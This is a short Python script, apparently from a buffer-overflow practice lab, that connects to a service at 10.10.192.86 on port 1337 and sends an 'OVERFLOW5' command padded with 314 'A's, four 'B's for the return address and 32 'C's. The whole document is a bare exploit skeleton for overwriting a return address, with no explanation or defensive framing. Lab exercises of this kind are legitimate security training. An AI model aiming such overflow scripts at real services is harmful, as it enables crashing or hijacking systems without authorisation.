#!/usr/bin/python
import socket

buffer = "A" * 314 + "B" * 4 + "C" * 32

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.192.86',1337))
print("Sending: %s" % str(buffer))
s.send(("OVERFLOW5 " + buffer))
s.close()


#10.10.33.2